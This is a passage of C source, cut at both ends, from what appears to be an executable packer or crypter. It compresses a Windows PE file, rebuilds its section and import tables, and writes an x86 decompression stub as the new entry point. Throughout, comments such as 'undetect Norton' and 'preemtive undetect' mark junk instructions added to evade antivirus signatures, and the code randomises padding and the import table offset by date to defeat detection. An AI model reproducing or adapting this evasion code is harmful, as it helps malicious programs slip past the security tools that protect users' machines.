			DWORD StubPointerToRawData = NtHeaders->OptionalHeader.SizeOfHeaders + CompressedBufferSizeAligned;

			//dprintf("Stub address %X\r\nStubPointerToRawData %X\r\n", StubAddress, StubPointerToRawData);
			//for(UINT i = 0; i < 16; i++)
				//dprintf("%d:%X %d\r\n", i, NtHeaders->OptionalHeader.DataDirectory[i].VirtualAddress, NtHeaders->OptionalHeader.DataDirectory[i].Size);

			//dprintf("StubAddress = %X STUB_SIZE = %X CompressedBufferSizeAligned = %X\\r\n", StubAddress, STUB_SIZE, CompressedBufferSizeAligned);

			/*PCHAR ImportNameDLL;
			PCHAR ImportNameFunc;

			IMAGE_THUNK_DATA* ThunkData;
			IMAGE_THUNK_DATA ZeroThunkData;
			IMAGE_IMPORT_BY_NAME* ImportByName;
			memset(&ZeroThunkData, NULL, sizeof(ZeroThunkData));

			IMAGE_IMPORT_DESCRIPTOR* ImportDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)(Buffer + RvaToVa((PCHAR)Buffer, NtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress));
			IMAGE_IMPORT_DESCRIPTOR ZeroImportDescriptor;
			memset(&ZeroImportDescriptor, NULL, sizeof(ZeroImportDescriptor));
			dprintf("Import table size %d, RVA %X\r\n", NtHeaders->OptionalHeader.DataDirectory[1].Size, NtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress);

			do{
			ThunkData = (IMAGE_THUNK_DATA*)(Buffer + RvaToVa((PCHAR)Buffer, ImportDescriptor->OriginalFirstThunk));
				do{
					ImportByName = (IMAGE_IMPORT_BY_NAME*)(Buffer + RvaToVa((PCHAR)Buffer, ThunkData->u1.AddressOfData));
					ImportNameDLL = (PCHAR)Buffer + RvaToVa((PCHAR)Buffer, ImportDescriptor->Name);
					ImportNameFunc = (PCHAR)Buffer + RvaToVa((PCHAR)Buffer, (DWORD)ImportByName->Name);
					dprintf("%s:", ImportNameDLL);
					if(ThunkData->u1.Ordinal & IMAGE_ORDINAL_FLAG32)
						dprintf("Ordinal #%d\r\n", LOWORD(ThunkData->u1.Ordinal));
					else
						dprintf("%s\r\n", ImportByName->Name);
					ThunkData++;
				}while(memcmp(ThunkData, &ZeroThunkData, sizeof(IMAGE_THUNK_DATA)));
				ImportDescriptor++;
			}while(memcmp(ImportDescriptor, &ZeroImportDescriptor, sizeof(IMAGE_IMPORT_DESCRIPTOR)));*/

			SYSTEMTIME SystemTime;
			GetSystemTime(&SystemTime);
			UINT ImportsOffsetVariation = SystemTime.wDay; // different import table offset depending on day

			DWORD OldNumberOfSections = NtHeaders->FileHeader.NumberOfSections;
			NtHeaders->FileHeader.NumberOfSections = 3;

			Section = (IMAGE_SECTION_HEADER*)(End);
			memcpy((PCHAR)Section->Name, ".text\0\0\0", 8);
			Section->SizeOfRawData = 0;//CompressedBufferSizeAligned + STUB_SIZE;//StubAddress - STUB_SIZE; // 0;
			Section->Misc.VirtualSize = StubAddress - STUB_SIZE;
			Section->PointerToRawData = NtHeaders->OptionalHeader.SizeOfHeaders; // 0;
			DWORD OriginalStartAddress = Section->VirtualAddress;

			Section->Characteristics = IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ;

			Section++;
			memcpy((PCHAR)Section->Name, ".rdata\0\0", 8);
			Section->SizeOfRawData = STUB_SIZE;
			Section->Misc.VirtualSize = STUB_SIZE;
			Section->PointerToRawData = StubPointerToRawData;
			Section->VirtualAddress = StubAddress;

			Section->Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ;

			Section++;
			memcpy((PCHAR)Section->Name, ".data\0\0\0", 8);
			Section->SizeOfRawData = CompressedBufferSize;
			Section->Misc.VirtualSize = CompressedBufferSizeAligned;
			Section->PointerToRawData = NtHeaders->OptionalHeader.SizeOfHeaders;
			Section->VirtualAddress = StubAddress + STUB_SIZE;
			while(Section->VirtualAddress % NtHeaders->OptionalHeader.SectionAlignment)
				Section->VirtualAddress++;

			Section->Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;
			memcpy(Buffer + Section->PointerToRawData, CompressedBuffer, CompressedBufferSize);
			//memset(Buffer + Section->PointerToRawData + CompressedBufferSize, 0x00, CompressedBufferSizeAligned - CompressedBufferSize); // replace with random
			for(UINT i = 0; i < CompressedBufferSizeAligned - CompressedBufferSize; i++)
				Buffer[Section->PointerToRawData + CompressedBufferSize + i] = rand_r(0, 0xFF);

			NtHeaders->OptionalHeader.SizeOfImage = Section->VirtualAddress + CompressedBufferSizeAligned;
			NtHeaders->OptionalHeader.MinorImageVersion = Rotated << 8 | Xored;
			//NtHeaders->OptionalHeader.SizeOfCode = STUB_SIZE;
			//NtHeaders->OptionalHeader.BaseOfCode = 0;
			//NtHeaders->OptionalHeader.BaseOfData = 0;
			//NtHeaders->OptionalHeader.SizeOfUninitializedData = StubAddress - STUB_SIZE;//StubPointerToRawData;
			//NtHeaders->OptionalHeader.SizeOfInitializedData = CompressedBufferSizeAligned + STUB_SIZE;
			//for(UINT i = 0; i < 16; i++){
			//	NtHeaders->OptionalHeader.DataDirectory[i].VirtualAddress = 0;
			//	NtHeaders->OptionalHeader.DataDirectory[i].Size = 0;
			//}
			Section = (IMAGE_SECTION_HEADER*)(End);
			for(UINT i = 0; i < OriginalNtHeaders.FileHeader.NumberOfSections; i++)
				Section++;
			for(UINT i = 0; i < NtHeaders->OptionalHeader.SizeOfHeaders - ((PCHAR)Section - (PCHAR)Buffer); i++)
				(*((PCHAR)Section + i)) = rand_r(0, 2) == 0 ? (UCHAR)rand_r(0, 0xFF) : (UCHAR)rand_r(0, 0x20);

			PBYTE TempPntr = Buffer + RvaToVa(NtHeaders, StubAddress);
			for(UINT i = 0; i < STUB_SIZE; i++)
				TempPntr[i] = rand_r(0, 1) == 0 ? (UCHAR)rand_r(0, 0xFF) : (UCHAR)rand_r(0, 0x20);

			PBYTE VarPointer = (PBYTE)End;
			VarPointer += sizeof(IMAGE_SECTION_HEADER) * OldNumberOfSections;
			DWORD Temp = StubAddress + STUB_SIZE;
			PDWORD VarPointerD = (PDWORD)VarPointer;
			*VarPointerD = Temp;
			VarPointerD++;
			*VarPointerD = CompressedBufferSize;

		// set up import tables for the stub's essential loadlibrary and getprocaddress functions and virtualprotect for header modification

			NtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress = StubAddress + (STUB_SIZE - /* total size */ 0x86) - ImportsOffsetVariation;
			NtHeaders->OptionalHeader.DataDirectory[1].Size = sizeof(IMAGE_IMPORT_DESCRIPTOR) * (/* # of imports */ 1 + /* zeroed descriptor */ 1);

			//dprintf("   %X->%X\r\n", NtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress, RvaToVa(NtHeaders, NtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress));

			IMAGE_IMPORT_DESCRIPTOR ImportDesc;
			memset(&ImportDesc, NULL, sizeof(ImportDesc));
			ImportDesc.ForwarderChain = 0;
			ImportDesc.TimeDateStamp = 0;
			IMAGE_THUNK_DATA Thunk[2][/* # of functions */ 3 + /* zeroed thunk */ 1];
			memset(&Thunk[0][3], NULL, sizeof(IMAGE_THUNK_DATA));
			memset(&Thunk[1][3], NULL, sizeof(IMAGE_THUNK_DATA));
		    
			DWORD AsciiRva = NtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress + NtHeaders->OptionalHeader.DataDirectory[1].Size;
			ImportDesc.Name = AsciiRva;//RvaToVa(NtHeaders, AsciiRva);
			strcpy((PCHAR)Buffer + RvaToVa(NtHeaders, AsciiRva), "Kernel32.dll");
			AsciiRva += strlen("Kernel32.dll") + 1;

			WORD Hint;

			Hint = 0xDF;
			Thunk[0][0].u1.AddressOfData = AsciiRva;
			Thunk[1][0].u1.AddressOfData = AsciiRva;
			//dprintf("%X->%X\r\n", AsciiRva, RvaToVa(NtHeaders, AsciiRva));
			memcpy((PCHAR)Buffer + RvaToVa(NtHeaders, AsciiRva), &Hint, sizeof(WORD));
			AsciiRva += sizeof(WORD);
			//dprintf("%X\r\n", RvaToVa(NtHeaders, AsciiRva));
			strcpy((PCHAR)Buffer + RvaToVa(NtHeaders, AsciiRva), "LoadLibraryA");
			AsciiRva += strlen("LoadLibraryA") + 1;

			Hint = 0x53;
			Thunk[0][1].u1.AddressOfData = AsciiRva;
			Thunk[1][1].u1.AddressOfData = AsciiRva;
			memcpy((PCHAR)Buffer + RvaToVa(NtHeaders, AsciiRva), &Hint, sizeof(WORD));
			AsciiRva += sizeof(WORD);
			strcpy((PCHAR)Buffer + RvaToVa(NtHeaders, AsciiRva), "GetProcAddress");
			AsciiRva += strlen("GetProcAddress") + 1;

			Hint = 0x0379;
			Thunk[0][2].u1.AddressOfData = AsciiRva;
			Thunk[1][2].u1.AddressOfData = AsciiRva;
			memcpy((PCHAR)Buffer + RvaToVa(NtHeaders, AsciiRva), &Hint, sizeof(WORD));
			AsciiRva += sizeof(WORD);
			strcpy((PCHAR)Buffer + RvaToVa(NtHeaders, AsciiRva), "VirtualProtect");
			AsciiRva += strlen("VirtualProtect") + 1;

			ImportDesc.OriginalFirstThunk = AsciiRva;
			memcpy((PCHAR)Buffer + RvaToVa(NtHeaders, AsciiRva), Thunk[0], sizeof(Thunk[0]));
			AsciiRva += sizeof(Thunk[0]);
			ImportDesc.FirstThunk = AsciiRva;
			memcpy((PCHAR)Buffer + RvaToVa(NtHeaders, AsciiRva), Thunk[1], sizeof(Thunk[1]));
			AsciiRva += sizeof(Thunk[1]);

			PBYTE LoadLibraryFunction = (PBYTE)BaseAddress + ImportDesc.FirstThunk;
			PBYTE GetProcAddressFunction = (PBYTE)BaseAddress + ImportDesc.FirstThunk + sizeof(DWORD);
			PBYTE VirtualProtectFunction = (PBYTE)BaseAddress + ImportDesc.FirstThunk + sizeof(DWORD) + sizeof(DWORD);

			memcpy((PCHAR)Buffer + RvaToVa(NtHeaders, NtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress), &ImportDesc, sizeof(ImportDesc));
			memset((PCHAR)Buffer + RvaToVa(NtHeaders, NtHeaders->OptionalHeader.DataDirectory[1].VirtualAddress + sizeof(ImportDesc)), NULL, sizeof(ImportDesc));
			UINT EndOfImports = RvaToVa(NtHeaders, AsciiRva);
			for(UINT i = EndOfImports; i < EndOfImports + ImportsOffsetVariation; i++)
				(*(PCHAR)(Buffer + i)) = rand_r(0, 0xFF);

		//

			NtHeaders->OptionalHeader.AddressOfEntryPoint = StubAddress;

			PBYTE CurrentAddress = Buffer + RvaToVa(NtHeaders, StubAddress);

			const BYTE OP_RETN = 0xC3;
			const BYTE OP_PUSH_ESP = 0x54;
			const BYTE OP_PUSH_EBP = 0x55;
			const BYTE OP_PUSH_EDX = 0x52;
			const BYTE OP_PUSH_ECX = 0x51;
			const BYTE OP_PUSH_EAX = 0x50;
			const BYTE OP_PUSH_ESI = 0x56;
			const BYTE OP_PUSH_EBX = 0x53;
			const BYTE OP_PUSH_DWORD = 0x68;
			const BYTE OP_POP_EBP = 0x5D;
			const BYTE OP_POP_EBX = 0x5B;
			const BYTE OP_POP_ECX = 0x59;
			const BYTE OP_POP_EDX = 0x5A;
			const BYTE OP_POP_EAX = 0x58;
			const BYTE OP_JMP_SHORT = 0xEB;
			const BYTE OP_JMP_NEAR = 0xE9;
			const BYTE OP_JE_SHORT = 0x74;
			const BYTE OP_JNZ_SHORT = 0x75;
			const BYTE OP_JNZ_NEAR[2] = {0x0F, 0x85};
			const BYTE OP_JL_SHORT = 0x7C;
			const BYTE OP_JL_NEAR[2] = {0x0F, 0x8C};
			const BYTE OP_JGE_SHORT = 0x7D;
			const BYTE OP_MOV_CH = 0xB5;
			const BYTE OP_MOV_CL_CH[2] = {0x8A, 0xCD};
			const BYTE OP_MOV_CH_BL[2] = {0x8A, 0xEB};
			const BYTE OP_MOV_EBP_ESP[2] = {0x8B, 0xEC};
			const BYTE OP_MOV_ESP_EBP[2] = {0x8B, 0xE5};
			const BYTE OP_MOV_ECX_EDI[2] = {0x8B, 0xCF};
			const BYTE OP_MOV_EBX_EAX[2] = {0x8B, 0xD8};
			const BYTE OP_MOV_ESI_EAX[2] = {0x8B, 0xF0};
			const BYTE OP_MOV_EAX_DWORD = 0xB8;
			const BYTE OP_MOV_EBX_DWORD = 0xBB;
			const BYTE OP_MOV_ECX_DWORD = 0xB9;
			const BYTE OP_MOV_EDX_DWORD = 0xBA;
			const BYTE OP_MOV_ESI_DWORD = 0xBE;
			const BYTE OP_MOV_EDI_DWORD = 0xBF;
			const BYTE OP_MOV_EBP_DWORD = 0xBD;
			const BYTE OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD[2] = {0x8B, 0x85};
			const BYTE OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD[2] = {0x8B, 0x9D};
			const BYTE OP_MOV_EDX_DWORD_PTR_EBP_PLUS_DWORD[2] = {0x8B, 0x95};
			const BYTE OP_MOV_DWORD_PTR_EBP_EAX_DWORD[2] = {0x89, 0x45};
			const BYTE OP_MOV_BYTE_PTR_ESP_PLUS_EAX_BYTE[3] = {0xC6, 0x04, 0x04};
			const BYTE OP_MOV_DWORD_PTR_ESP_PLUS_EAX_AL[3] = {0x88, 0x04, 0x04};
			const BYTE OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EAX[2] = {0x89, 0x85};
			const BYTE OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EBX[2] = {0x89, 0x9D};
			const BYTE OP_MOV_DWORD_PTR_EBX_EAX[2] = {0x89, 0x03};
			const BYTE OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_DWORD[2] = {0xC7, 0x85};
			const BYTE OP_MOV_DWORD_PTR_DWORD[3] = {0x36, 0xC7, 0x05};
			const BYTE OP_MOV_BL_BYTE_PTR_DWORD[3] = {0x36, 0x8A, 0x1D};
			const BYTE OP_MOV_DL_BYTE_PTR_EAX_PLUS_DWORD[3] = {0x36, 0x8A, 0x90};
			const BYTE OP_MOV_BL_BYTE_PTR_EAX_PLUS_DWORD[3] = {0x36, 0x8A, 0x98};
			const BYTE OP_MOV_EAX_DWORD_PTR_EBP_PLUS_ECX[4] = {0x36, 0x8B, 0x04, 0x29};
			const BYTE OP_MOV_BYTE_PTR_EBP_PLUS_ESI_AL[4] = {0x36, 0x88, 0x04, 0x2E};
			const BYTE OP_MOV_BYTE_PTR_EBP_PLUS_ECX_AL[4] = {0x36, 0x88, 0x04, 0x29};
			const BYTE OP_MOV_EAX_DWORD_PTR_EBX[2] = {0x8B, 0x03};
			const BYTE OP_MOV_BYTE_PTR_EAX_0[3] = {0xC6, 0x00, 0x00};
			const BYTE OP_MOV_BYTE_PTR_EBP_PLUS_EDX_AL[3] = {0x88, 0x04, 0x2A};
			const BYTE OP_MOV_AL_BYTE_PTR_EBP_PLUS_EDX[3] = {0x8A, 0x04, 0x2A};
			const BYTE OP_DEC_EAX = 0x48;
			const BYTE OP_DEC_EDX = 0x4A;
			const BYTE OP_DEC_EDI = 0x4F;
			const BYTE OP_SUB_ESP_DWORD[2] = {0x81, 0xEC};
			const BYTE OP_CALL_DWORD_PTR[2] = {0xFF, 0x15};
			const BYTE OP_CALL_DWORD = 0xE8;
			const BYTE OP_CMP_EAX_DWORD = 0x3D;
			const BYTE OP_CMP_ESI_DWORD[2] = {0x81, 0xFE};
			const BYTE OP_CMP_EDI_DWORD[2] = {0x81, 0xFF};
			const BYTE OP_CMP_EBX_DWORD[2] = {0x81, 0xFB};
			const BYTE OP_CMP_EDX_DWORD[2] = {0x81, 0xFA};
			const BYTE OP_CMP_EDX_0[3] = {0x83, 0xFA, 0x00};
			const BYTE OP_CMP_EAX_0[3] = {0x83, 0xF8, 0x00};
			const BYTE OP_ADD_EAX_EBX[2] = {0x03, 0xC3};
			const BYTE OP_ADD_ESP_DWORD[2] = {0x81, 0xC4};
			const BYTE OP_ADD_EBX_BYTE[2] = {0x83, 0xC3};
			const BYTE OP_ADD_EAX_DWORD = 0x05;
			const BYTE OP_ADD_EDX_DWORD[2] = {0x81, 0xC2};
			const BYTE OP_AND_EAX_DWORD = 0x25;
			const BYTE OP_SUB_EBX_SHORT[2] = {0x83, 0xEB};
			const BYTE OP_SUB_EBX_EAX[2] = {0x2B, 0xD8};
			const BYTE OP_SUB_EAX_EBX[2] = {0x2B, 0xC3};
			const BYTE OP_SUB_ECX_EAX[2] = {0x2B, 0xC8};
			const BYTE OP_SUB_ECX_EDX[2] = {0x2B, 0xCA};
			const BYTE OP_SUB_ECX_EBX[2] = {0x2B, 0xCB};
			const BYTE OP_SUB_CH_BL[2] = {0x2A, 0xEB};
			const BYTE OP_SUB_ECX_DWORD[2] = {0x81, 0xE9};
			const BYTE OP_SUB_EDX_DWORD[2] = {0x81, 0xEA};
			const BYTE OP_SUB_EAX_BYTE[2] = {0x83, 0xE8};
			const BYTE OP_SHL_DL_CL[2] = {0xD2, 0xE2};
			const BYTE OP_SHR_DL_CL[2] = {0xD2, 0xEA};
			const BYTE OP_SHL_BL_CL[2] = {0xD2, 0xE3};
			const BYTE OP_SHR_BL_CL[2] = {0xD2, 0xEB};
			const BYTE OP_ROR_DL_BYTE[2] = {0xC0, 0xCA};
			const BYTE OP_ROR_BL_BYTE[2] = {0xC0, 0xCB};
			const BYTE OP_INC_EAX = 0x40;
			const BYTE OP_INC_ECX = 0x41;
			const BYTE OP_INC_ESI = 0x46;
			const BYTE OP_INC_EDI = 0x47;
			const BYTE OP_NOP = 0x90;
			const BYTE OP_OR_DL_BL[2] = {0x08, 0xDA};
			const BYTE OP_OR_EDX_ECX[2] = {0x09, 0xCA};
			const BYTE OP_XOR_EDI_EDI[2] = {0x33, 0xFF};
			const BYTE OP_XOR_DL_BYTE[2] = {0x80, 0xF2};
			const BYTE OP_XOR_BL_BYTE[2] = {0x80, 0xF3};
			const BYTE OP_XCHG_DL_DH[2] = {0x86, 0xF2};

			DWORD VAR_BYTEOFFSET = OFFSETSIZE;
			DWORD VAR_BITOFFSET = VAR_BYTEOFFSET + sizeof(VAR_BYTEOFFSET);
			DWORD VAR_BITSTOREAD = VAR_BITOFFSET + sizeof(VAR_BITOFFSET);
			DWORD VAR_BITSTOREADL = VAR_BITSTOREAD + sizeof(VAR_BITSTOREAD);
			DWORD VAR_BITSTOREADH = VAR_BITSTOREADL + sizeof(VAR_BITSTOREADL);
			DWORD VAR_STOREDBYTES = VAR_BITSTOREADH + sizeof(VAR_BITSTOREADH);
			#define LOCAL_VARS_SIZE 4 * 5 + LENGTHSIZE

			DWORD ByteOffsetBase = NtHeaders->OptionalHeader.ImageBase + StubAddress + STUB_SIZE;
			DWORD CodeBase = NtHeaders->OptionalHeader.ImageBase + StubAddress;

			PBYTE BeginingAddress = CurrentAddress;
			// set up stack
			WriteBigEndian(CurrentAddress, &OP_PUSH_EBP, sizeof(OP_PUSH_EBP)); CurrentAddress += sizeof(OP_PUSH_EBP);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_ESP_DWORD, sizeof(OP_SUB_ESP_DWORD)); CurrentAddress += sizeof(OP_SUB_ESP_DWORD);
			DWORD StackSize = OFFSETSIZE + LOCAL_VARS_SIZE;

			//WriteBigEndian(CurrentAddress, (PBYTE)&OP_NOP, sizeof(OP_NOP)); CurrentAddress += sizeof(OP_NOP); // undetect

			WriteLittleEndian(CurrentAddress, (PBYTE)&StackSize, sizeof(StackSize)); CurrentAddress += sizeof(StackSize);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBP_ESP, sizeof(OP_MOV_EBP_ESP)); CurrentAddress += sizeof(OP_MOV_EBP_ESP);
		WriteBigEndian(CurrentAddress, (PBYTE)&OP_PUSH_ECX, sizeof(OP_PUSH_ECX)); CurrentAddress += sizeof(OP_PUSH_ECX); // undetect
		WriteBigEndian(CurrentAddress, (PBYTE)&OP_POP_ECX, sizeof(OP_POP_ECX)); CurrentAddress += sizeof(OP_POP_ECX);    // 
			//WriteBigEndian(CurrentAddress, (PBYTE)&OP_NOP, sizeof(OP_NOP)); CurrentAddress += sizeof(OP_NOP); // undetect  11/12/06

			WriteBigEndian(CurrentAddress, &OP_MOV_EAX_DWORD, sizeof(OP_MOV_EAX_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&StackSize, sizeof(StackSize)); CurrentAddress += sizeof(StackSize);

			//WriteBigEndian(CurrentAddress, (PBYTE)&OP_NOP, sizeof(OP_NOP)); CurrentAddress += sizeof(OP_NOP); // undetect

			//WriteBigEndian(CurrentAddress, (PBYTE)&OP_NOP, sizeof(OP_NOP)); CurrentAddress += sizeof(OP_NOP); // undetect  12/10/06

			//WriteBigEndian(CurrentAddress, (PBYTE)&OP_NOP, sizeof(OP_NOP)); CurrentAddress += sizeof(OP_NOP); // preemtive undetect 1/9/07

			//WriteBigEndian(CurrentAddress, (PBYTE)&OP_NOP, sizeof(OP_NOP)); CurrentAddress += sizeof(OP_NOP); // preemtive undetect 3/9/07

			// zero stack and set up initial dictionary
			PBYTE MemZeroLabel = CurrentAddress;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_ESP_PLUS_EAX_AL, sizeof(OP_MOV_DWORD_PTR_ESP_PLUS_EAX_AL)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_ESP_PLUS_EAX_AL);
			WriteBigEndian(CurrentAddress, &OP_CMP_EAX_DWORD, sizeof(OP_CMP_EAX_DWORD)); CurrentAddress += sizeof(OP_CMP_EAX_DWORD);
			DWORD InitialDictionary = 0x100;
			WriteLittleEndian(CurrentAddress, (PBYTE)&InitialDictionary, sizeof(InitialDictionary)); CurrentAddress += sizeof(InitialDictionary);
			WriteBigEndian(CurrentAddress, &OP_JL_SHORT, sizeof(OP_JL_SHORT)); CurrentAddress += sizeof(OP_JL_SHORT);
			BYTE JumpOffset = sizeof(OP_JL_SHORT) + sizeof(OP_MOV_BYTE_PTR_ESP_PLUS_EAX_BYTE);
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_BYTE_PTR_ESP_PLUS_EAX_BYTE, sizeof(OP_MOV_BYTE_PTR_ESP_PLUS_EAX_BYTE)); CurrentAddress += sizeof(OP_MOV_BYTE_PTR_ESP_PLUS_EAX_BYTE);
			BYTE Zero = 0x00;
			WriteLittleEndian(CurrentAddress, (PBYTE)&Zero, sizeof(Zero)); CurrentAddress += sizeof(Zero);
			WriteBigEndian(CurrentAddress, &OP_DEC_EAX, sizeof(OP_DEC_EAX)); CurrentAddress += sizeof(OP_DEC_EAX);
			WriteBigEndian(CurrentAddress, &OP_JNZ_SHORT, sizeof(OP_JNZ_SHORT)); CurrentAddress += sizeof(OP_JNZ_SHORT);
			JumpOffset = MemZeroLabel - (CurrentAddress + sizeof(JumpOffset));
			WriteLittleEndian(CurrentAddress, &JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_ESP_PLUS_EAX_AL, sizeof(OP_MOV_DWORD_PTR_ESP_PLUS_EAX_AL)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_ESP_PLUS_EAX_AL);

			/*// zero main data
			WriteBigEndian(CurrentAddress, &OP_MOV_EAX_DWORD, sizeof(OP_MOV_EAX_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD);
			DWORD MemStart = NtHeaders->OptionalHeader.ImageBase + OriginalStartAddress;
			WriteLittleEndian(CurrentAddress, (PBYTE)&MemStart, sizeof(MemStart)); CurrentAddress += sizeof(MemStart);
			PBYTE Loop3Label = CurrentAddress;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_BYTE_PTR_EAX_0, sizeof(OP_MOV_BYTE_PTR_EAX_0)); CurrentAddress += sizeof(OP_MOV_BYTE_PTR_EAX_0);
			WriteBigEndian(CurrentAddress, &OP_INC_EAX, sizeof(OP_INC_EAX)); CurrentAddress += sizeof(OP_INC_EAX);
			WriteBigEndian(CurrentAddress, &OP_CMP_EAX_DWORD, sizeof(OP_CMP_EAX_DWORD)); CurrentAddress += sizeof(OP_CMP_EAX_DWORD);
			DWORD MemSize = NtHeaders->OptionalHeader.ImageBase + StubAddress - STUB_SIZE;
			WriteLittleEndian(CurrentAddress, (PBYTE)&MemSize, sizeof(MemSize)); CurrentAddress += sizeof(MemSize);
			WriteBigEndian(CurrentAddress, &OP_JL_SHORT, sizeof(OP_JL_SHORT)); CurrentAddress += sizeof(OP_JL_SHORT);
			JumpOffset = -(CurrentAddress - Loop3Label + sizeof(JumpOffset));
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);*/
			

			// jump past the functions
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_JMP_NEAR, sizeof(OP_JMP_NEAR)); CurrentAddress += sizeof(OP_JMP_NEAR);
			DWORD JumpNear = 0xDE + 1; // plus nop
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpNear, sizeof(JumpNear)); CurrentAddress += sizeof(JumpNear);

			// get bits function
			PBYTE GetBitsFunctionLabel = CurrentAddress;
				// BitsToReadL(EBX) = ((BitsToRead + BitOffset) > 8 ? (8 - BitOffset) : BitsToRead);
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITOFFSET, sizeof(VAR_BITOFFSET)); CurrentAddress += sizeof(VAR_BITOFFSET);
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EBX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREAD, sizeof(VAR_BITSTOREAD)); CurrentAddress += sizeof(VAR_BITSTOREAD);

	WriteBigEndian(CurrentAddress, (PBYTE)&OP_NOP, sizeof(OP_NOP)); CurrentAddress += sizeof(OP_NOP); // undetect Norton

			WriteBigEndian(CurrentAddress, (PBYTE)&OP_ADD_EAX_EBX, sizeof(OP_ADD_EAX_EBX)); CurrentAddress += sizeof(OP_ADD_EAX_EBX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_CMP_EAX_DWORD, sizeof(OP_CMP_EAX_DWORD)); CurrentAddress += sizeof(OP_CMP_EAX_DWORD);
			DWORD Comparison = 0x08;
			WriteLittleEndian(CurrentAddress, (PBYTE)&Comparison, sizeof(Comparison)); CurrentAddress += sizeof(Comparison);
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EAX_DWORD_PTR_EBP_PLUS_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITOFFSET, sizeof(VAR_BITOFFSET)); CurrentAddress += sizeof(VAR_BITOFFSET);
			JumpOffset = sizeof(OP_MOV_EBX_DWORD) + sizeof(Comparison) + sizeof(OP_SUB_EBX_EAX);
			WriteBigEndian(CurrentAddress, &OP_JL_SHORT, sizeof(OP_JL_SHORT)); CurrentAddress += sizeof(OP_JL_SHORT);
			WriteLittleEndian(CurrentAddress, (PBYTE)&JumpOffset, sizeof(JumpOffset)); CurrentAddress += sizeof(JumpOffset);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EBX_DWORD, sizeof(OP_MOV_EBX_DWORD)); CurrentAddress += sizeof(OP_MOV_EBX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Comparison, sizeof(Comparison)); CurrentAddress += sizeof(Comparison);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_SUB_EBX_EAX, sizeof(OP_SUB_EBX_EAX)); CurrentAddress += sizeof(OP_SUB_EBX_EAX);
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EBX, sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EBX)); CurrentAddress += sizeof(OP_MOV_DWORD_PTR_EBP_PLUS_DWORD_EBX);
			WriteLittleEndian(CurrentAddress, (PBYTE)&VAR_BITSTOREADL, sizeof(VAR_BITSTOREADL)); CurrentAddress += sizeof(VAR_BITSTOREADL);
				// ShiftLeft(CL) = (8 - BitOffset) - BitsToReadL;
			WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_ECX_DWORD, sizeof(OP_MOV_ECX_DWORD)); CurrentAddress += sizeof(OP_MOV_ECX_DWORD);
			WriteLittleEndian(CurrentAddress, (PBYTE)&Comparison, sizeof(Comparison)); CurrentAddress += sizeof(Comparison);
			//MOV ECX 8
            WriteBigEndian(CurrentAddress, (PBYTE)&OP_MOV_EDX_DWORD_PTR_EBP_PLUS_DWORD, sizeof(OP_MOV_EDX_DWORD_PTR_EBP_PLUS_DWORD)); CurrentAddress += sizeof(OP_MOV_EDX_DWORD_PTR_EBP_PLUS_DWORD);
